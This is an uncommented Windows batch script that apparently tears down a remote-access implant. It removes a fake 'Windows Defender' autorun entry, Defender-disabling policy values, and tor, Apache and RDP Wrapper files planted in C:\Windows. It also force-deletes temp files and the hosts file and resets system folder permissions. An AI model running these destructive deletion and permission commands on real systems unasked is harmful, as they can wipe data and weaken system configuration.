
REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /f  
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f

attrib -s -h "C:\Windows\System32\drivers\etc\hosts"
attrib -s -h "C:\Windows\System32\drivers\etc"
taskkill /f /im tor.exe
taskkill /f /im "Windows Defender.exe"
nircmd exec hide "C:\Program Files\RDP Wrapper\uninstall.bat"
timeout -t 10
taskkill /f /im expose.exe
taskkill /f /im httpd.exe
nircmd execmd del /s /f /q /a "C:\Windows\Windows Defender.exe"
nircmd execmd del /s /f /q /a "C:\Windows\expose.exe"
nircmd execmd del /s /f /q /a "C:\Windows\curl.exe"
nircmd execmd del /s /f /q /a "C:\Windows\tor.exe"
nircmd execmd rmdir /s /q "%appdata%\Ookla"
nircmd execmd rmdir /s /q "C:\Windows\Win32"
nircmd execmd rmdir /s /q "C:\Program Files\RDP Wrapper"
nircmd execmd rmdir /s /q  "C:\Windows\apache2"
nircmd execmd rmdir /s /q  "C:\Windows\7-Zip"
nircmd execmd del /s /f /q /a "C:\Windows\nircmd.exe"
Taskkill /f /im winrun.exe
del /s /f /q /a "%temp%\*"
FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
del /s /f /q /a "C:\Windows\Win32\*.bat"
taskkill /F /IM wscript.exe
taskkill /F /IM cscript.exe
TAKEOWN /F "C:\Windows\System32\drivers\etc" /R /D N
cd \
cd "C:\Windows\System32\drivers\etc\
del /s /f /q /a "Hosts"

icacls "C:\Windows\System32\drivers\etc" /reset /T /C
icacls "C:\Windows" /reset /C
taskkill /f /im timeout.exe
taskkill /f /im explorer.exe
start "" "%windir%\explorer.exe"  
